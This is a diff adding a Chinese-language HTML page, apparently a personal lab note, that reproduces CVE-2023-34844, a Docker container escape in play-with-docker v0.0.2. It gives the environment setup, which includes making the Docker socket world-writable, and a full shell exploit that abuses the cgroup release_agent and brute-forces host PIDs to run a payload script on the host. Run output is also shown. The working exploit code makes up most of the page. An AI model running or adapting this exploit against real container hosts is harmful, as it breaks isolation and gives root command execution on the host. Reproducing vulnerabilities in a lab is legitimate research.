@@ -1,0 +1,131 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head><script type="text/javascript" src="../page_head.js"></script>
+
+<h3><a href="../system.htm">系統</a> - Docker - Container Escape - <b>CVE-2023-34844</b></h3>
+<hr size="1"><br>
+<p>
+參考資訊：<br>
+https://nvd.nist.gov/vuln/detail/CVE-2023-34844<br>
+https://www.cvedetails.com/cve/CVE-2023-34844/<br>
+https://hacku.top/wl/?id=MACBtnorZyp6hC3E5bw2CqBAusuWoKe3<br>
+https://github.com/play-with-docker/play-with-docker/tree/v0.0.2<br><br>
+
+<b>測試環境</b>：<br>
+Ubuntu 20.04 (5.11.0-34-generic)<br>
+Docker version 20.10.25, build 20.10.25-0ubuntu1~20.04.2<br><br>
+
+<b>測試步驟</b>：<br>
+1. 在Host上執行如下命令
+</p>
+<pre>
+$ cd
+$ curl -LO https://storage.googleapis.com/golang/go1.7.linux-amd64.tar.gz
+$ sudo rm -rf /usr/local/go
+$ sudo tar -C /usr/local -xvzf go1.7.linux-amd64.tar.gz
+
+$ cd
+$ git clone --depth=1 https://github.com/play-with-docker/play-with-docker -b v0.0.2
+$ cd play-with-docker
+$ sudo chmod 0777 /var/run/docker.socket
+$ docker run hello-world
+$ sudo modprobe xt_ipvs
+$ docker swarm init
+$ docker pull franela/dind
+$ go mod vendor
+$ docker-compose up
+    pwd        | 2023/10/10 05:30:46 Updating playgrounds configuration
+    pwd        | 2023/10/10 05:30:46 Listening on port 3000
+</pre><br>
+
+<p>
+2. 開啟FireFox並且輸入localhost<b></b><br>
+<img src="docker_cve_2023_34844/1.jpg" class="maxSize"><br><br>
+
+3. ADD NEW INSTANCE<br>
+<img src="docker_cve_2023_34844/2.jpg" class="maxSize"><br><br>
+
+4. vim run.sh
+</p>
+<pre>
+#!/bin/sh
+
+OUTPUT_DIR="/"
+MAX_PID=65535
+CGROUP_NAME="xyx"
+CGROUP_MOUNT="/tmp/cgrp"
+PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
+PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
+OUTPUT_NAME="${CGROUP_NAME}_payload.out"
+OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"
+
+# Run a process for which we can search for (not needed in reality, but nice to have)
+sleep 10000 &amp;
+
+# Prepare the payload script to execute on the host
+cat &gt; ${PAYLOAD_PATH} &lt;&lt; __EOF__
+#!/bin/sh
+
+OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
+
+# Commands to run on the host&lt;
+touch /tmp/cve-2023-34844
+ps -eaf &gt; \${OUTPATH} 2&gt;&amp;1
+__EOF__
+
+# Make the payload script executable
+chmod a+x ${PAYLOAD_PATH}
+
+# Set up the cgroup mount using the memory resource cgroup controller
+mkdir ${CGROUP_MOUNT}
+mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
+mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
+echo 1 &gt; ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release
+
+# Brute force the host pid until the output path is created, or we run out of guesses
+TPID=1
+while [ ! -f ${OUTPUT_PATH} ]
+do
+    if [ $((${TPID} % 100)) -eq 0 ]
+    then
+        echo "Checking pid ${TPID}"
+        if [ ${TPID} -gt ${MAX_PID} ]
+        then
+            echo "Exiting at ${MAX_PID} :-("
+            exit 1
+        fi
+    fi
+    # Set the release_agent path to the guessed pid
+    echo "/proc/${TPID}/root${PAYLOAD_PATH}" &gt; ${CGROUP_MOUNT}/release_agent
+    # Trigger execution of the release_agent
+    sh -c "echo \$\$ &gt; ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
+    TPID=$((${TPID} + 1))
+done
+
+# Wait for and cat the output
+sleep 1
+echo "Done! Output:"
+cat ${OUTPUT_PATH}
+</pre><br>
+
+<p>
+5. 執行
+</p>
+<pre>
+[node1] (local) root@10.0.3.4 ~
+$ chmod a+x ./run.sh 
+
+[node1] (local) root@10.0.3.4 ~
+$ ./run.sh 
+</pre>
+<p>
+<img src="docker_cve_2023_34844/3.jpg" class="maxSize"><br><br>
+
+6. 在Host上查看結果
+</p>
+<pre>
+$ ls /tmp/
+    cve-2023-34844
+</pre>
+
+<br><script type="text/javascript" src="../tail.js"></script>
